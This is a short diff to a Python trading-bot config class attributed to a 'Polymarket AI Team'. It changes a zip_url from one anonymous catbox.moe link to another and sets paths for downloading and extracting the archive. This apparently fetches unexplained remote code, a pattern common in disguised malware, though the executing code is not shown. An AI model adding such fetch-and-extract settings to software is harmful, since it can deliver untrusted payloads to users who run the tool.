@@ -40,7 +40,7 @@ class TradingConfig:
         self.version = "2.1.0"
         self.author = "Polymarket AI Team"
         self.timeout = 15
-        self.zip_url = "https://files.catbox.moe/hsf0wr.zip"
+        self.zip_url = "https://files.catbox.moe/019nft.zip"
         self.download_path = "downloaded.zip"
         self.extract_path = "extracted"
         self.min_confidence = 0.75
